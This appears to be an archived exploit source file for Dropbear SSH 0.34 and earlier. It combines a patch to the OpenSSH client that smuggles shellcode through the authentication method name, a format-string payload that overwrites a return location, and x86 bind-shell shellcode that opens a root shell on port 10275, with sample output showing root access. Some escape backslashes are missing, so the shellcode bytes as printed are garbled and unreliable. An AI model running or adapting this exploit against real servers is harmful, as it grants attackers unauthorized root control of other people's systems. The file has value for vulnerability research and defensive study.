/*
* Linux x86 Dropbear SSH <= 0.34 remote root exploit
* coded by live
*
* You'll need a hacked ssh client to try this out. I included a patch
* to openssh-3.6.p1 somewhere below this comment.
*
* The point is: the buffer being exploited is too small(25 bytes) to hold our
* shellcode, so a workaround was needed in order to send it. What I did here
* was to hack the ssh client so that it sends the local   environment variable
* SHELLCODE as ssh's methodname string.   This method   was described by Joel
* Eriksson @ 0xbadc0ded.org.
*
* The 25 bytes limitation is also the reason for the the strange ``2 byte''
* retaddr you will see here. That's not enough for complete pointer overwrite,
* so I decided to   overwrite 3rd and 2nd   bytes and hope our   shellcode is
* around ;)
*
* % telnet localhost 22
* Trying 127.0.0.1...
* Connected to localhost.
* Escape character is '^]'.
* SSH-2.0-dropbear_0.34
* ^]
* telnet> quit
* Connection closed.
*
* % objdump -R /usr/local/sbin/dropbear| grep malloc
* 080673bc R_386_JUMP_SLOT   malloc
*
* % drop-root -v24 localhost
* ?.2022u%24$hn@localhost's password:
* Connection closed by 127.0.0.1
*
* % telnet localhost 10275
* Trying 127.0.0.1...
* Connected to localhost.
* Escape character is '^]'.
* id; exit;
* uid=0(root) gid=0(root) groups=0(root)
* Connection closed by foreign host.
*
* In the above example we were able to lookup a suitable .got entry(used as
* retloc here), but this may not be true under a hostile environment. If
* exploiting this remotely I feel like chances would be greater if we attack
* the stack, but that's just a guess.
*
* Version pad is 24 to 0.34, 12 to 0.32. I don't know about other versions.
*
* gr33tz: ppro, alcaloide and friends.
*
* 21.08.2003
* Please do not distribute
*/



/*

--- sshconnect2.c2003-08-21 21:34:03.000000000 -0300
+++ sshconnect2.c.hack2003-08-21 21:33:47.000000000 -0300
@@ -278,6 +278,8 @@
void
userauth(Authctxt *authctxt, char *authlist)
{
+     char *shellcode = getenv("SHELLCODE");
+
if (authlist == NULL) {
authlist = authctxt->authlist;
} else {
@@ -290,6 +292,7 @@
if (method == NULL)
fatal("Permission denied (%s).", authlist);
authctxt->method = method;
+         authctxt->method->name = shellcode;
if (method->userauth(authctxt) != 0) {
debug2("we sent a %s packet, wait for reply", method->name);
break;

*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>


#define SSH_PATH               "ssh"
#define SSH_PORT               "22"

#define DEFAULT_VERSION_PAD     24
#define DEFAULT_RETLOC         0xbffff800
#define DEFAULT_RETADDR         0x080e /* 2 byte retaddr, not enough space for a
                                      * full overwrite. */


/* fork/bind shellcode by live
* default port is 10275
*
* I believe this can be futher optmized, but size is not
* an issue here since we are sending the shellcode through
* a ssh variable which is about 30k bytes long.
*/
char shellcode[] =
    "x31xc0"                       /* xor     %eax,%eax               */
    "xb0x02"                       /* mov     $0x2,%al                 */
    "xcdx80"                       /* int     $0x80                   */
    "x85xc0"                       /* test   %eax,%eax               */
    "x75x54"                       /* jne     5e                       */
    "xebx50"                       /* jmp     5c                       */
    "x5e"                           /* pop     %esi                     */
    "x31xc0"                       /* xor     %eax,%eax               */
    "x31xdb"                       /* xor     %ebx,%ebx               */
    "x89x46x08"                   /* mov     %eax,0x8(%esi)           */
    "xb0x02"                       /* mov     $0x2,%al                 */
    "x89x06"                       /* mov     %eax,(%esi)             */
    "xfexc8"                       /* dec     %al                     */
    "x89x46x04"                   /* mov     %eax,0x4(%esi)           */
    "xb0x66"                       /* mov     $0x66,%al               */
    "xfexc3"                       /* inc     %bl                     */
    "x89xf1"                       /* mov     %esi,%ecx               */
    "xcdx80"                       /* int     $0x80                   */
    "x89x06"                       /* mov     %eax,(%esi)             */
    "x89x4ex04"                   /* mov     %ecx,0x4(%esi)           */
    "x80x46x04x0c"               /* addb   $0xc,0x4(%esi)           */
    "x31xc0"                       /* xor     %eax,%eax               */
    "xb0x10"                       /* mov     $0x10,%al               */
    "x89x46x08"                   /* mov     %eax,0x8(%esi)           */
    "xb0x02"                       /* mov     $0x2,%al                 */
    "x66x89x46x0c"               /* mov     %ax,0xc(%esi)           */
    "x66xb8x28x23"               /* mov     $0x2328,%ax             */
    "x89x46x0e"                   /* mov     %eax,0xe(%esi)           */
    "x31xc0"                       /* xor     %eax,%eax               */
    "x89x46x10"                   /* mov     %eax,0x10(%esi)         */
    "xb0x66"                       /* mov     $0x66,%al               */
    "xfexc3"                       /* inc     %bl                     */
    "xcdx80"                       /* int     $0x80                   */
    "xfexcb"                       /* dec     %bl                     */
    "x89x5ex04"                   /* mov     %ebx,0x4(%esi)           */
    "x31xc0"                       /* xor     %eax,%eax               */
    "xb0x66"                       /* mov     $0x66,%al               */
    "xb3x04"                       /* mov     $0x4,%bl                 */
    "xcdx80"                       /* int     $0x80                   */
    "xebx04"                       /* jmp     60                       */
    "xebx44"                       /* jmp     a2                       */
    "xebx3a"                       /* jmp     9a                       */
    "x31xc0"                       /* xor     %eax,%eax               */
    "x89x46x04"                   /* mov     %eax,0x4(%esi)           */
    "x89x46x08"                   /* mov     %eax,0x8(%esi)           */
    "xb0x66"                       /* mov     $0x66,%al               */
    "xfexc3"                       /* inc     %bl                     */
    "xcdx80"                       /* int     $0x80                   */
    "x31xc9"                       /* xor     %ecx,%ecx               */
    "x89xc3"                       /* mov     %eax,%ebx               */
    "x31xc0"                       /* xor     %eax,%eax               */
    "xb0x3f"                       /* mov     $0x3f,%al               */
    "xcdx80"                       /* int     $0x80                   */
    "xfexc1"                       /* inc     %cl                     */
    "x80xf9x03"                   /* cmp     $0x3,%cl                 */
    "x75xf3"                       /* jne     72                       */
    "x68x2fx2fx73x68"           /* push   $0x68732f2f             */
    "x68x2fx62x69x6e"           /* push   $0x6e69622f             */
    "x89xe3"                       /* mov     %esp,%ebx               */
    "x31xc0"                       /* xor     %eax,%eax               */
    "x88x43x08"                   /* mov     %al,0x8(%ebx)           */
    "x50"                           /* push   %eax                     */
    "x53"                           /* push   %ebx                     */
    "x89xe1"                       /* mov     %esp,%ecx               */
    "x89xe2"                       /* mov     %esp,%edx               */
    "xb0x0b"                       /* mov     $0xb,%al                 */
    "xcdx80"                       /* int     $0x80                   */
    "x31xc0"                       /* xor     %eax,%eax               */
    "x31xdb"                       /* xor     %ebx,%ebx               */
    "xfexc0"                       /* inc     %al                     */
    "xcdx80"                       /* int     $0x80                   */
    "xe8x65xffxffxff"           /* call   c <up>                   */
;


static void usage(const char *progname);


int
main(int argc, char *argv[])
{
    char buffer[29500], fmt[26], *target;
    long int retloc, retaddr;
    int ch, version_pad;

    retloc           = DEFAULT_RETLOC +1;
    retaddr         = DEFAULT_RETADDR -40;
    version_pad     = DEFAULT_VERSION_PAD;

    while ( (ch = getopt(argc, argv, "l:r:v:")) != -1) {
        switch (ch) {
            case 'l':
                retloc += atoi(optarg) *4;
                break;
            case 'r':
                retaddr += atoi(optarg) *4;
                break;
            case 'v':
                version_pad = atoi(optarg);
                break;
        }
    }

    if (argc -optind != 1) {
        usage(argv[0]);
        exit(-1);
    }

    argc -= optind;
    argv += optind;

    target = argv[0];
    memset(buffer, 0x90, 29500);
    memcpy(buffer +29500 -strlen(shellcode), shellcode, strlen(shellcode));
    memcpy(buffer, "SHELLCODE=", 10);

    putenv(buffer);
    snprintf(fmt, sizeof fmt, "%c%c%c%c%%.%du%%%d$hn",
        (retloc & 0xff),
        (retloc & 0xff00) >> 8,
        (retloc & 0xff0000) >> 16,
        (retloc & 0xff000000) >> 24,
        retaddr,
        version_pad);

    execl(SSH_PATH, "ssh", "-l", fmt, "-p", SSH_PORT, target, NULL);
    exit(0);
}


static void
usage(const char *progname) {
    fprintf(stderr, "Linux x86 Dropbear SSH <= 0.34 remote root exploitn");
    fprintf(stderr, "coded by livenn");
    fprintf(stderr, "Usage: %s [-l <retloc offset>] [-r <retaddr offset>]"
        " [-v <version pad>] <target>n", progname);
}

// milw0rm.com [2004-08-09]